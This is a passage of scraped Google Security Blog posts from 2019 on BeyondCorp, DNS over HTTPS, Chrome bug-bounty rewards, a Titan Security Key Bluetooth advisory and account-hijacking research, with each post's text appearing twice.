prescribed values to those which are observed.Prior to implementing BeyondCorp, we performed a fleet-wide audit to ensure the quality of inventory data, and we perform smaller audits regularly across the fleet. Automation is key to achieving this, both for entering data initially and for detecting divergence at later points. For example, instead of having a human enter data into the system manually, we use digital manifests and barcode scanners as much as possible.  How do we figure out whether devices are trustworthy?  After appropriate management systems have been put in place, and data quality goals have been met, the pertinent security information related to a device can be used to establish a \"trust\" decision as to whether a given action should be allowed to be performed from the device.          High level architecture for BeyondCorp     This decision can be most effectively made when an abundance of information about the device is readily available. At Google, we use an aggregated data pipeline to gather information from various sources, which each contain a limited subset of knowledge about a device and its history, and make this data available at the point when a trust decision is being made.  Various systems and repositories are employed within Google to perform collection and storage of device data that is relevant to security. These include tools like asset management repositories, device management solutions, vulnerability scanners, and internal directory services, which contain information and state about the multitude of physical device types (e.g., desktops, laptops, phones, tablets), as well as virtual desktops, used by employees at the company.Having data from these various types of information systems available when making a trust decision for a given device can certainly be advantageous. However, challenges can present themselves when attempting to correlate records from a diverse set of systems which may not have a clear, consistent way to reference the identity of a given device. The challenge of implementation has been offset by the gains in security policy flexibility and improvements in securing our data.   What lessons did we learn?As we rolled out BeyondCorp, we iteratively improved our fleet management and inventory processes as outlined above. These improvements are based on various lessons we learned around data quality challenges.Audit your data ahead of implementing BeyondCorpData quality issues and inaccuracies are almost certain to be present in an asset management system of any substantial size, and these issues must be corrected before the data can be utilized in a manner which will have a significant impact on user experience. Having the means to compare values that have been manually entered into such systems against similar data that has been collected from devices via automation can allow for the correction of discrepancies, which may interrupt the intended behavior of the system.  Prepare to encounter unforeseen data quality challengesNumerous data incorrectness scenarios and challenging issues are likely to present themselves as the reliance on accurate data increases. For example, be prepared to encounter issues with data ingestion processes that rely on transcribing device identifier information, which is physically labeled on devices or their packaging, and may incorrectly differ from identifier data that is digitally imprinted on the device.In addition, over reliance on the assumed uniqueness of certain device identifiers can sometimes be problematic in the rare cases where conventionally unique attributes, like serial numbers, can appear more than once in the device fleet (this can be especially exacerbated in the case of virtual desktops, where such identifiers may be chosen by a user without regard for such concerns).Lastly, routine maintenance and hardware replacements performed on employee devices can result in ambiguous situations with regards to the \"identity\" of a device. When internal device components, like network adapters or mainboards, are found to be defective and replaced, the device's identity can be changed into a state which no longer matches the known inventory data if care is not taken to correctly reflect such changes.   Implement controls to maintain high quality asset inventoryAfter inventory data has been brought to an acceptable correctness level, mechanisms should be put into place to limit the ability for new inaccuracies to be introduced. For example, at Google, data correctness checks have been integrated into the provisioning process for new devices so that inventory records must be correct before a device can be successfully imaged with an operating system, ensuring that the device will meet required data accuracy standards before being delivered to an employee.    Next timeIn the next post in this series, we will discuss a tiered access approach, how to create rule-based trust and the lessons we’ve learned through that process.In the meantime, if you want to learn more, you can check out the BeyondCorp research papers. In addition, getting started with BeyondCorp is now easier using zero trust solutions from Google Cloud (context-aware access) and other enterprise providers.Thank you to the editors of the BeyondCorp blog post series, Puneet Goel (Product Manager), Lior Tishbi (Program Manager), and Justin McWilliams (Engineering Manager).     ", "date": "August 20, 2019"},
{"website": "Google-Security", "title": "\nGoogle Public DNS over HTTPS (DoH) supports RFC 8484 standard\n", "author": ["Posted by Marshall Vale, Product Manager and Alexander Dupuy, Software Engineer"], "link": "https://security.googleblog.com/2019/06/google-public-dns-over-https-doh.html", "abstract": "                             Posted by Marshall Vale, Product Manager and Alexander Dupuy, Software Engineer     Ever since we launched Google Public DNS in 2009, our priority has been the security of DNS resolution. In 2016, we launched a unique and innovative experimental service -- DNS over HTTPS, now known as DoH. Today we are announcing general availability for our standard DoH service. Now our users can resolve DNS using DoH at the dns.google domain with the same anycast addresses (like 8.8.8.8) as regular DNS service, with lower latency from our  edge PoPs  throughout the world.    General availability of DoH includes full RFC 8484 support at a new URL path, and continued support for the JSON API launched in 2016. The new endpoints are:       https://dns.google/dns-query (RFC 8484 &#8211;  GET and POST )   https://dns.google/resolve ( JSON API  &#8211; GET)      We are deprecating internet-draft DoH support on the /experimental URL path and DoH service from dns.google.com, and will turn down support for them in a few months.         With Google Public DNS, we&#8217;re committed to providing fast, private, and secure DNS resolution through both DoH and DNS over TLS ( DoT ). We plan to support the JSON API until there is a comparable standard for webapp-friendly DoH.              What the new DoH service means for developers            To use our DoH service, developers should configure their applications to use the new DoH endpoints and properly handle HTTP 4xx error and 3xx redirection status codes.       Applications should use  dns.google instead of dns.google.com . Applications can query dns.google at well-known  Google Public DNS addresses , without needing an extra DNS lookup.   Developers using the older /experimental internet-draft DoH API need to  switch to the new /dns-query URL path  and confirm full RFC 8484 compliance. The older API accepts queries using features from early drafts of the DoH standard that are rejected by the new API.   Developers using the  JSON API  can use two new GET parameters that can be used for DNS/DoH proxies or DNSSEC-aware applications.       Redirection of /experimental and dns.google.com              The /experimental API will be turned down in 30 days and HTTP requests for it will get an HTTP redirect to an equivalent https://dns.google/dns-query URI. Developers should make sure DoH applications handle HTTP redirects by retrying at the URI specified in the Location header.         Turning down the dns.google.com domain will take place in three stages.       The first stage (in 45 days) will update the dns.google.com domain name to return 8.8.8.8 and other Google Public DNS anycast addresses, but continue to return DNS responses to queries sent to former addresses of dns.google.com. This will provide a transparent transition for most clients.   The second stage (in 90 days) will return HTTP redirects to dns.google for queries sent to former addresses of dns.google.com.   The final stage (in 12 months) will send HTTP redirects to dns.google for any queries sent to the anycast addresses using the dns.google.com domain.      We will post timelines for redirections on the  public&#8209;dns&#8209;announce  forum and on the  DoH migration page . You can find further technical details in our  DoH documentation , and if you have a question or problem with our DoH service, you can  create an issue on our tracker  or ask on our  discussion group . As always, please provide as much information as possible to help us investigate the problem!                                       Posted by Marshall Vale, Product Manager and Alexander Dupuy, Software Engineer  Ever since we launched Google Public DNS in 2009, our priority has been the security of DNS resolution. In 2016, we launched a unique and innovative experimental service -- DNS over HTTPS, now known as DoH. Today we are announcing general availability for our standard DoH service. Now our users can resolve DNS using DoH at the dns.google domain with the same anycast addresses (like 8.8.8.8) as regular DNS service, with lower latency from our edge PoPs throughout the world.  General availability of DoH includes full RFC 8484 support at a new URL path, and continued support for the JSON API launched in 2016. The new endpoints are:   https://dns.google/dns-query (RFC 8484 – GET and POST) https://dns.google/resolve (JSON API – GET)   We are deprecating internet-draft DoH support on the /experimental URL path and DoH service from dns.google.com, and will turn down support for them in a few months.    With Google Public DNS, we’re committed to providing fast, private, and secure DNS resolution through both DoH and DNS over TLS (DoT). We plan to support the JSON API until there is a comparable standard for webapp-friendly DoH.     What the new DoH service means for developers    To use our DoH service, developers should configure their applications to use the new DoH endpoints and properly handle HTTP 4xx error and 3xx redirection status codes.   Applications should use dns.google instead of dns.google.com. Applications can query dns.google at well-known Google Public DNS addresses, without needing an extra DNS lookup. Developers using the older /experimental internet-draft DoH API need to switch to the new /dns-query URL path and confirm full RFC 8484 compliance. The older API accepts queries using features from early drafts of the DoH standard that are rejected by the new API. Developers using the JSON API can use two new GET parameters that can be used for DNS/DoH proxies or DNSSEC-aware applications.   Redirection of /experimental and dns.google.com     The /experimental API will be turned down in 30 days and HTTP requests for it will get an HTTP redirect to an equivalent https://dns.google/dns-query URI. Developers should make sure DoH applications handle HTTP redirects by retrying at the URI specified in the Location header.    Turning down the dns.google.com domain will take place in three stages.   The first stage (in 45 days) will update the dns.google.com domain name to return 8.8.8.8 and other Google Public DNS anycast addresses, but continue to return DNS responses to queries sent to former addresses of dns.google.com. This will provide a transparent transition for most clients. The second stage (in 90 days) will return HTTP redirects to dns.google for queries sent to former addresses of dns.google.com. The final stage (in 12 months) will send HTTP redirects to dns.google for any queries sent to the anycast addresses using the dns.google.com domain.   We will post timelines for redirections on the public‑dns‑announce forum and on the DoH migration page. You can find further technical details in our DoH documentation, and if you have a question or problem with our DoH service, you can create an issue on our tracker or ask on our discussion group. As always, please provide as much information as possible to help us investigate the problem!      ", "date": "June 26, 2019"},
{"website": "Google-Security", "title": "\nBigger Rewards for Security Bugs\n", "author": ["Posted by Natasha Pabrai and Andrew Whalley, Chrome Security Team\n"], "link": "https://security.googleblog.com/2019/07/bigger-rewards-for-security-bugs.html", "abstract": "                             Posted by Natasha Pabrai and Andrew Whalley, Chrome Security Team     Chrome has always been built with security at its core, by a passionate worldwide community as part of the  Chromium  open source project. We're proud that community includes world class security researchers who help defend Chrome, and other Chromium based browsers.     Back in 2010  we created  the Chrome Vulnerability Rewards Program which provides cash rewards to researchers for finding and reporting security bugs that help keep our users safe. Since its inception the program has received over 8,500 reports and paid out over five million dollars! A big thank you to every one of the researchers - it's an honor working with you.     Over the years we've expanded the program, including rewarding full chain exploits on Chrome OS, and the  Chrome Fuzzer Program , where we run researchers' fuzzers on thousands of Google cores and automatically submit bugs they find for reward.     Today, we're delighted to announce an across the board increase in our reward amounts! Full details can be found on our  program rules page  but highlights include tripling the maximum baseline reward amount from $5,000 to $15,000 and doubling the maximum reward amount for high quality reports from $15,000 to $30,000. The additional bonus given to bugs found by fuzzers running under Chrome Fuzzer Program is also doubling to $1,000.     We've also clarified what we consider a  high quality report , to help reporters get the highest possible reward, and we've updated the bug categories to better reflect the types of bugs that are reported and that we are most interested in.     But that's not all! On Chrome OS we're increasing our standing reward to $150,000 for exploit chains that can compromise a Chromebook or Chromebox with persistence in guest mode. Security bug in firmware and lock screen bypasses also get their own reward categories.     These new reward amounts will apply to bugs submitted after today on the  Chromium bug tracker using the Security template . As always, see the  Chrome Vulnerability Reward Program Rules  for full details about the program.     In other news, our friends over at the  Google Play Security Reward Program  have increased their rewards for remote code execution bugs from $5,000 to $20,000, theft of insecure private data from $1,000 to $3,000, and access to protected app components from $1,000 to $3,000. The Google Play Security Reward Program also pays bonus rewards for responsibly disclosing vulnerabilities to participating app developers. Check out the  program  to learn more and see which apps are in scope.     Happy bug hunting!                                     Posted by Natasha Pabrai and Andrew Whalley, Chrome Security Team   Chrome has always been built with security at its core, by a passionate worldwide community as part of the Chromium open source project. We're proud that community includes world class security researchers who help defend Chrome, and other Chromium based browsers.   Back in 2010 we created the Chrome Vulnerability Rewards Program which provides cash rewards to researchers for finding and reporting security bugs that help keep our users safe. Since its inception the program has received over 8,500 reports and paid out over five million dollars! A big thank you to every one of the researchers - it's an honor working with you.   Over the years we've expanded the program, including rewarding full chain exploits on Chrome OS, and the Chrome Fuzzer Program, where we run researchers' fuzzers on thousands of Google cores and automatically submit bugs they find for reward.   Today, we're delighted to announce an across the board increase in our reward amounts! Full details can be found on our program rules page but highlights include tripling the maximum baseline reward amount from $5,000 to $15,000 and doubling the maximum reward amount for high quality reports from $15,000 to $30,000. The additional bonus given to bugs found by fuzzers running under Chrome Fuzzer Program is also doubling to $1,000.   We've also clarified what we consider a high quality report, to help reporters get the highest possible reward, and we've updated the bug categories to better reflect the types of bugs that are reported and that we are most interested in.   But that's not all! On Chrome OS we're increasing our standing reward to $150,000 for exploit chains that can compromise a Chromebook or Chromebox with persistence in guest mode. Security bug in firmware and lock screen bypasses also get their own reward categories.   These new reward amounts will apply to bugs submitted after today on the Chromium bug tracker using the Security template. As always, see the Chrome Vulnerability Reward Program Rules for full details about the program.   In other news, our friends over at the Google Play Security Reward Program have increased their rewards for remote code execution bugs from $5,000 to $20,000, theft of insecure private data from $1,000 to $3,000, and access to protected app components from $1,000 to $3,000. The Google Play Security Reward Program also pays bonus rewards for responsibly disclosing vulnerabilities to participating app developers. Check out the program to learn more and see which apps are in scope.   Happy bug hunting!      ", "date": "July 18, 2019"},
{"website": "Google-Security", "title": "\nHow Google adopted BeyondCorp\n", "author": ["Posted by Lior Tishbi, Program Manager and Puneet Goel, Product Manager, Justin McWilliams, Engineering Manager"], "link": "https://security.googleblog.com/2019/06/how-google-adopted-beyondcorp.html", "abstract": "                             Posted by Lior Tishbi, Program Manager and Puneet Goel, Product Manager, Justin McWilliams, Engineering Manager         It's been almost five years since we released  the first of multiple BeyondCorp papers , describing the motivation and design principles that eliminated network-based trust from our internal networks. With that anniversary looming and many organizations actively working to adopt models like BeyondCorp (which has also become known as Zero Trust in the industry), we thought it would be a good time to revisit topics we have previously explored in those papers, share the lessons that we have learned over the years, and describe where BeyondCorp is going as businesses move to the cloud.     This is the first post in a series that will focus on Google&#8217;s internal implementation of  BeyondCorp , providing necessary context for how Google adopted BeyondCorp.      Why did we adopt BeyondCorp?  With a traditional enterprise perimeter security model, access to services and resources is provided by a device being connected to a privileged network. If an employee is in a corporate office, on the right network, services are directly accessible. If they're outside the office, at home or in a coffee shop, they frequently use a VPN to get access to services behind the enterprise firewall. This is the way most organizations protect themselves.     By 2011, it became clear to Google that this model was problematic, and we needed to rethink how enterprise services are accessed and protected for the following reasons:      Improving productivity       A growing number of employees were not in the office at all times. They were working from home, a coffee shop, a hotel or even on a bus or airplane. When they were outside the office, they needed to connect via a VPN, creating friction and extending the network perimeter.     The user experience of a VPN client may be acceptable, even if suboptimal, from a laptop. Use of VPN is less acceptable, from both employees and admins perspectives, when considering growing use of devices such as smartphones and tablets to perform work.     A number of users were contractors or other partners who only needed selective access to some of our internal resources, even though they were working in the office.      Keeping Google secure       The expanded use of public clouds and software-as-a-service (SaaS) apps meant that some of our corporate services were no longer deployed on-premises, further blurring the traditional perimeter and trust domain. This introduced new attack vectors that needed to be protected against.     There was ongoing concern about relying solely on perimeter defense, especially when the perimeter was growing consistently. With the proliferation of laptops and mobile devices, vulnerable and compromised devices were regularly brought within the perimeter.      Finally, if a vulnerability was observed or an attack did happen, we wanted the ability to respond as quickly and automatically as possible.        How did we do it?  In order to address these challenges, we implemented a new approach that we called BeyondCorp. Our mission was to have every Google employee work successfully from untrusted networks on a variety of devices without using a client-side VPN. BeyondCorp has three core principles:      Connecting from a particular network does not determine which service you can access.     Access to services is granted based on what the infrastructure knows about you and your device.     All access to services must be authenticated, authorized and encrypted for every request (not just the initial access).                   High level architecture for BeyondCorp        BeyondCorp gave us the security that we were looking for along with the user experience that made our employees more productive inside and outside the office.     What lessons did we learn?  Given this was uncharted territory at the time, we had to learn quickly and adapt when we encountered surprises. Here are some key lessons we learned.     Obtain executive support early on and keep it  Moving to BeyondCorp is not a quick, painless exercise. It took us several years just to get most of the basics in place, and to this day we are still continuing to improve and refine our implementation. Before embarking on this journey to implement BeyondCorp, we got buy in from leadership very early in the project. With a mandate, you can ask for support from lots of different groups along the way.    We make a point to re-validate this buy-in on an ongoing basis, ensuring that the business still understands and values this important shift.     Recognize data quality challenges from the very beginning  Access decisions depend on the quality of your input data. More specifically, it depends on trust analysis, which requires a combination of employee and device data.    If this data is unreliable, the result will be incorrect access decisions, suboptimal user experiences and, in the worst case, an increase in system vulnerability, so the stakes are definitely high.   We put in a lot of work to make sure our data is clean and reliable before making any impactful changes, and we have both workflows and technical measures in place to ensure data quality remains high going forward.     Enable painless migration and usage  The migration should be a zero-touch or invisible experience for your employees, making it easy for them to continue working without interruptions or added steps. If you make it difficult for your employees to migrate or maintain productivity, they might feel frustrated by the process. Complex environments are difficult to fully migrate with initial solutions, so be prepared to review, grant and manage exceptions at least in the early stages. With this in mind, start small, migrate a small number of resources, apps, users and devices, and only increase coverage after confirming the solution is reliable.    Assign employee and helpdesk advocates  We also had employee and helpdesk advocates on the team who represented the user experience from those perspectives. This helped us architect our implementation in a way that avoided putting excess burden on employees or technical support staff.     Clear employee communications  Communicating clearly with employees so that they know what is happening is very important. We sent our employees, partners, and company leaders regular communications whenever we made important changes, ensuring motivations were well understood and there was a window for feedback and iteration prior to enforcement changes.     Run highly reliable systems  Since every request goes through the core BeyondCorp infrastructure, we needed a global, highly reliable and resilient set of services. If these services are degraded, employee productivity suffers.    We used  Site Reliability Engineering (SRE)  principles to run our BeyondCorp services.     Next time  In the next post in this series, we will go deeper into when you should trust a device, what data you should use to determine whether or not a device should be trusted, and what we have learned by going through that process.     In the meantime, if you want to learn more, you can check out the  BeyondCorp research papers . In addition, getting started with BeyondCorp is now easier using zero trust solutions from  Google Cloud (context-aware access)  and other enterprise providers.      This post was updated on July 3 to include Justin McWilliams&nbsp;as an author.                                    Posted by Lior Tishbi, Program Manager and Puneet Goel, Product Manager, Justin McWilliams, Engineering Manager    It's been almost five years since we released the first of multiple BeyondCorp papers, describing the motivation and design principles that eliminated network-based trust from our internal networks. With that anniversary looming and many organizations actively working to adopt models like BeyondCorp (which has also become known as Zero Trust in the industry), we thought it would be a good time to revisit topics we have previously explored in those papers, share the lessons that we have learned over the years, and describe where BeyondCorp is going as businesses move to the cloud.   This is the first post in a series that will focus on Google’s internal implementation of BeyondCorp, providing necessary context for how Google adopted BeyondCorp.    Why did we adopt BeyondCorp? With a traditional enterprise perimeter security model, access to services and resources is provided by a device being connected to a privileged network. If an employee is in a corporate office, on the right network, services are directly accessible. If they're outside the office, at home or in a coffee shop, they frequently use a VPN to get access to services behind the enterprise firewall. This is the way most organizations protect themselves.   By 2011, it became clear to Google that this model was problematic, and we needed to rethink how enterprise services are accessed and protected for the following reasons:   Improving productivity   A growing number of employees were not in the office at all times. They were working from home, a coffee shop, a hotel or even on a bus or airplane. When they were outside the office, they needed to connect via a VPN, creating friction and extending the network perimeter.   The user experience of a VPN client may be acceptable, even if suboptimal, from a laptop. Use of VPN is less acceptable, from both employees and admins perspectives, when considering growing use of devices such as smartphones and tablets to perform work.   A number of users were contractors or other partners who only needed selective access to some of our internal resources, even though they were working in the office.   Keeping Google secure   The expanded use of public clouds and software-as-a-service (SaaS) apps meant that some of our corporate services were no longer deployed on-premises, further blurring the traditional perimeter and trust domain. This introduced new attack vectors that needed to be protected against.   There was ongoing concern about relying solely on perimeter defense, especially when the perimeter was growing consistently. With the proliferation of laptops and mobile devices, vulnerable and compromised devices were regularly brought within the perimeter.    Finally, if a vulnerability was observed or an attack did happen, we wanted the ability to respond as quickly and automatically as possible.     How did we do it? In order to address these challenges, we implemented a new approach that we called BeyondCorp. Our mission was to have every Google employee work successfully from untrusted networks on a variety of devices without using a client-side VPN. BeyondCorp has three core principles:   Connecting from a particular network does not determine which service you can access.   Access to services is granted based on what the infrastructure knows about you and your device.   All access to services must be authenticated, authorized and encrypted for every request (not just the initial access).        High level architecture for BeyondCorp   BeyondCorp gave us the security that we were looking for along with the user experience that made our employees more productive inside and outside the office.   What lessons did we learn? Given this was uncharted territory at the time, we had to learn quickly and adapt when we encountered surprises. Here are some key lessons we learned.   Obtain executive support early on and keep it Moving to BeyondCorp is not a quick, painless exercise. It took us several years just to get most of the basics in place, and to this day we are still continuing to improve and refine our implementation. Before embarking on this journey to implement BeyondCorp, we got buy in from leadership very early in the project. With a mandate, you can ask for support from lots of different groups along the way.  We make a point to re-validate this buy-in on an ongoing basis, ensuring that the business still understands and values this important shift.   Recognize data quality challenges from the very beginning Access decisions depend on the quality of your input data. More specifically, it depends on trust analysis, which requires a combination of employee and device data.  If this data is unreliable, the result will be incorrect access decisions, suboptimal user experiences and, in the worst case, an increase in system vulnerability, so the stakes are definitely high.  We put in a lot of work to make sure our data is clean and reliable before making any impactful changes, and we have both workflows and technical measures in place to ensure data quality remains high going forward.   Enable painless migration and usage The migration should be a zero-touch or invisible experience for your employees, making it easy for them to continue working without interruptions or added steps. If you make it difficult for your employees to migrate or maintain productivity, they might feel frustrated by the process. Complex environments are difficult to fully migrate with initial solutions, so be prepared to review, grant and manage exceptions at least in the early stages. With this in mind, start small, migrate a small number of resources, apps, users and devices, and only increase coverage after confirming the solution is reliable.  Assign employee and helpdesk advocates We also had employee and helpdesk advocates on the team who represented the user experience from those perspectives. This helped us architect our implementation in a way that avoided putting excess burden on employees or technical support staff.   Clear employee communications Communicating clearly with employees so that they know what is happening is very important. We sent our employees, partners, and company leaders regular communications whenever we made important changes, ensuring motivations were well understood and there was a window for feedback and iteration prior to enforcement changes.   Run highly reliable systems Since every request goes through the core BeyondCorp infrastructure, we needed a global, highly reliable and resilient set of services. If these services are degraded, employee productivity suffers.  We used Site Reliability Engineering (SRE) principles to run our BeyondCorp services.   Next time In the next post in this series, we will go deeper into when you should trust a device, what data you should use to determine whether or not a device should be trusted, and what we have learned by going through that process.   In the meantime, if you want to learn more, you can check out the BeyondCorp research papers. In addition, getting started with BeyondCorp is now easier using zero trust solutions from Google Cloud (context-aware access) and other enterprise providers.   This post was updated on July 3 to include Justin McWilliams as an author.     ", "date": "June 27, 2019"},
{"website": "Google-Security", "title": "\nAdvisory: Security Issue with Bluetooth Low Energy (BLE) Titan Security Keys\n", "author": ["Posted by Christiaan Brand, Product Manager, Google Cloud"], "link": "https://security.googleblog.com/2019/05/titan-keys-update.html", "abstract": "                             Posted by Christiaan Brand, Product Manager, Google Cloud     We&#8217;ve become aware of an issue that affects the Bluetooth Low Energy (BLE) version of the Titan Security Key available in the U.S. and are providing users with the immediate steps they need to take to protect themselves and to receive a free replacement key. This bug affects Bluetooth pairing only, so non-Bluetooth security keys are not affected. Current users of Bluetooth Titan Security Keys should continue to use their existing keys while waiting for a replacement, since security keys provide the strongest protection against phishing.    What is the security issue?    Due to a misconfiguration in the Titan Security Keys&#8217; Bluetooth pairing protocols, it is possible for an attacker who is physically close to you at the moment you use your security key -- within approximately 30 feet -- to (a) communicate with your security key, or (b)   communicate with the device to which your key is paired. In order for the misconfiguration to be exploited, an attacker would have to align a series of events in close coordination:      When you&#8217;re trying to sign into an account on your device, you are normally asked to press the button on your BLE security key to activate it. An attacker in close physical proximity at that moment in time can potentially connect their own device to your affected security key before your own device connects. In this set of circumstances, the attacker could sign into your account using their own device if the attacker somehow already obtained your username and password and could time these events exactly.       Before you can use your security key, it must be paired to your device. Once paired, an attacker in close physical proximity to you could use their device to masquerade as your affected security key and connect to your device at the moment you are asked to press the button on your key. After that, they could attempt to change their device to appear as a Bluetooth keyboard or mouse and potentially take actions on your device.     This security issue does not affect the primary purpose of security keys, which is to protect you against phishing by a remote attacker. Security keys remain the strongest available protection against phishing; it is still safer to use a key that has this issue, rather than turning off security key-based two-step verification (2SV) on your Google Account or downgrading to less phishing-resistant methods (e.g. SMS codes or prompts sent to your device). This local proximity Bluetooth issue does not affect USB or NFC security keys.     Am I affected?    This issue affects the BLE version of Titan Security Keys. To determine if your key is affected, check the back of the key. If it has a &#8220;T1&#8221; or &#8220;T2&#8221; on the back of the key, your key is affected by the issue and is eligible for free replacement.                Steps to protect yourself     If you want to minimize the remaining risk until you receive your replacement keys, you can perform the following additional steps:     iOS devices:      On devices running iOS version 12.2 or earlier,  we recommend using your affected security key in a private place where a potential attacker is not within close physical proximity (approximately 30 feet). After you&#8217;ve used your key to sign into your Google Account on your device, immediately  unpair it . You can use your key in this manner again while waiting for your replacement, until you update to iOS 12.3.    Once you update to iOS 12.3 , your affected security key will no longer work. You will not be able to use your affected key to sign into your Google Account, or any other account protected by the key, and you will need to order a replacement key. If you are already signed into your Google Account on your iOS device, do not sign out because you won&#8217;t be able to sign in again until you get a new key. If you are locked out of your Google Account on your iOS device before your replacement key arrives, see  these instructions  for getting back into your account. Note that you can continue to sign into your Google Account on non-iOS devices.     On Android and other devices:     We recommend using your affected security key in a private place where a potential attacker is not within close physical proximity (approximately 30 feet). After you&#8217;ve used your affected security key to sign into your Google Account, immediately  unpair it . Android devices updated with the upcoming June 2019 Security Patch Level (SPL) and beyond will automatically unpair affected Bluetooth devices, so you won&#8217;t need to unpair manually. You can also continue to use your USB or NFC security keys, which are supported on Android and not affected by this issue.     How to get a replacement key - updated on 07/16/20     Starting on&nbsp;  July 16, 2020  , we are&nbsp;changing the key replacement process . After July 16, 2020, if you have purchased a &nbsp;Bluetooth Titan Security Key (\"T1\" or \"T2\") from the Google Store, you can&nbsp; contact the Google Store directly &nbsp;  for a replacement device.&nbsp;           Is it still safe to use my affected BLE Titan Security Key?    It is much safer to use the affected key instead of no key at all. Security keys are the strongest protection against phishing currently available.                                    Posted by Christiaan Brand, Product Manager, Google Cloud   We’ve become aware of an issue that affects the Bluetooth Low Energy (BLE) version of the Titan Security Key available in the U.S. and are providing users with the immediate steps they need to take to protect themselves and to receive a free replacement key. This bug affects Bluetooth pairing only, so non-Bluetooth security keys are not affected. Current users of Bluetooth Titan Security Keys should continue to use their existing keys while waiting for a replacement, since security keys provide the strongest protection against phishing.  What is the security issue?  Due to a misconfiguration in the Titan Security Keys’ Bluetooth pairing protocols, it is possible for an attacker who is physically close to you at the moment you use your security key -- within approximately 30 feet -- to (a) communicate with your security key, or (b) communicate with the device to which your key is paired. In order for the misconfiguration to be exploited, an attacker would have to align a series of events in close coordination:   When you’re trying to sign into an account on your device, you are normally asked to press the button on your BLE security key to activate it. An attacker in close physical proximity at that moment in time can potentially connect their own device to your affected security key before your own device connects. In this set of circumstances, the attacker could sign into your account using their own device if the attacker somehow already obtained your username and password and could time these events exactly.    Before you can use your security key, it must be paired to your device. Once paired, an attacker in close physical proximity to you could use their device to masquerade as your affected security key and connect to your device at the moment you are asked to press the button on your key. After that, they could attempt to change their device to appear as a Bluetooth keyboard or mouse and potentially take actions on your device.   This security issue does not affect the primary purpose of security keys, which is to protect you against phishing by a remote attacker. Security keys remain the strongest available protection against phishing; it is still safer to use a key that has this issue, rather than turning off security key-based two-step verification (2SV) on your Google Account or downgrading to less phishing-resistant methods (e.g. SMS codes or prompts sent to your device). This local proximity Bluetooth issue does not affect USB or NFC security keys.   Am I affected?  This issue affects the BLE version of Titan Security Keys. To determine if your key is affected, check the back of the key. If it has a “T1” or “T2” on the back of the key, your key is affected by the issue and is eligible for free replacement.       Steps to protect yourself   If you want to minimize the remaining risk until you receive your replacement keys, you can perform the following additional steps:  iOS devices:   On devices running iOS version 12.2 or earlier, we recommend using your affected security key in a private place where a potential attacker is not within close physical proximity (approximately 30 feet). After you’ve used your key to sign into your Google Account on your device, immediately unpair it. You can use your key in this manner again while waiting for your replacement, until you update to iOS 12.3.  Once you update to iOS 12.3, your affected security key will no longer work. You will not be able to use your affected key to sign into your Google Account, or any other account protected by the key, and you will need to order a replacement key. If you are already signed into your Google Account on your iOS device, do not sign out because you won’t be able to sign in again until you get a new key. If you are locked out of your Google Account on your iOS device before your replacement key arrives, see these instructions for getting back into your account. Note that you can continue to sign into your Google Account on non-iOS devices.  On Android and other devices:   We recommend using your affected security key in a private place where a potential attacker is not within close physical proximity (approximately 30 feet). After you’ve used your affected security key to sign into your Google Account, immediately unpair it. Android devices updated with the upcoming June 2019 Security Patch Level (SPL) and beyond will automatically unpair affected Bluetooth devices, so you won’t need to unpair manually. You can also continue to use your USB or NFC security keys, which are supported on Android and not affected by this issue.  How to get a replacement key - updated on 07/16/20 Starting on July 16, 2020, we are changing the key replacement process. After July 16, 2020, if you have purchased a Bluetooth Titan Security Key (\"T1\" or \"T2\") from the Google Store, you can contact the Google Store directly for a replacement device.   Is it still safe to use my affected BLE Titan Security Key?  It is much safer to use the affected key instead of no key at all. Security keys are the strongest protection against phishing currently available.     ", "date": "May 15, 2019"},
{"website": "Google-Security", "title": "\nNew research: How effective is basic account hygiene at preventing hijacking\n", "author": ["Posted by Kurt Thomas and Angelika Moscicki"], "link": "https://security.googleblog.com/2019/05/new-research-how-effective-is-basic.html", "abstract": "                             Posted by Kurt Thomas and Angelika Moscicki     Every day, we protect users from hundreds of thousands of account hijacking attempts.  Most attacks  stem from automated bots with access to third-party password breaches, but we also see phishing and targeted attacks. Earlier this year, we suggested how  just five simple steps  like adding a recovery phone number can help keep you safe, but we wanted to prove it in practice.   We teamed up with researchers from New York University and the University of California, San Diego to find out just how effective basic account hygiene is at preventing hijacking. The year-long study, on  wide-scale attacks  and  targeted attacks , was presented on Wednesday at a gathering of experts, policy makers, and users called  The Web Conference .   Our research shows that simply adding a recovery phone number to your Google Account can block up to 100% of automated bots, 99% of bulk phishing attacks, and 66% of targeted attacks that occurred during our investigation.        Google&#8217;s automatic, proactive hijacking protection    We provide an automatic, proactive layer of security to better protect all our users against account hijacking. Here&#8217;s how it works: if we detect a suspicious sign-in attempt (say, from a new location or device), we&#8217;ll ask for additional proof that it&#8217;s really you. This proof might be confirming you have access to a trusted phone or answering a question where only you know the correct response.   If you&#8217;ve signed into your phone or set up a recovery phone number, we can provide a similar level of protection to  2-Step Verification  via device-based challenges. We found that an SMS code sent to a recovery phone number helped block 100% of automated bots, 96% of bulk phishing attacks, and 76% of targeted attacks.  On-device prompts , a more secure replacement for SMS, helped prevent 100% of automated bots, 99% of bulk phishing attacks and 90% of targeted attacks.                      Both device- and knowledge-based challenges help thwart automated bots, while device-based challenges help thwart phishing and even targeted attacks.                   If you don&#8217;t have a recovery phone number established, then we might fall back on the weaker knowledge-based challenges, like recalling your last sign-in location. This is an effective defense against bots, but protection rates for phishing can drop to as low as 10%. The same vulnerability exists for targeted attacks. That&#8217;s because phishing pages and targeted attackers can trick you into revealing any additional identifying information we might ask for.   Given the security benefits of challenges, one might ask why we don&#8217;t require them for all sign-ins. The answer is that challenges introduce additional friction and increase the risk of account lockout. In an experiment, 38% of users did not have access to their phone when challenged. Another 34% of users could not recall their secondary email address.   If you lose access to your phone, or can&#8217;t solve a challenge, you can always return to a trusted device you previously logged in from to gain access to your account.        Digging into &#8220;hack for hire&#8221; attacks    Where most bots and phishing attacks are blocked by our automatic protections, targeted attacks are more pernicious. As part of our ongoing efforts to  monitor hijacking threats , we have been investigating emerging &#8220;hack for hire&#8221; criminal groups that purport to break into a single account for a fee on the order of $750 USD. These attackers often rely on spear phishing emails that impersonate family members, colleagues, government officials, or even Google. If the target doesn&#8217;t fall for the first spear phishing attempt, follow-on attacks persist for upwards of a month.                      Example man-in-the-middle phishing attack that checks for password validity in real-time. Afterwards, the page prompts victims to disclose SMS authentication codes to access the victim&#8217;s account.            We estimate just one in a million users face this level of risk. Attackers don&#8217;t target random individuals though. While the research shows that our automatic protections can help delay, and even prevent as many as 66% of the targeted attacks that we studied, we still recommend that high-risk users enroll in our  Advanced Protection Program . In fact, zero users that exclusively use security keys fell victim to targeted phishing during our investigation.               Take a moment to help keep your account secure     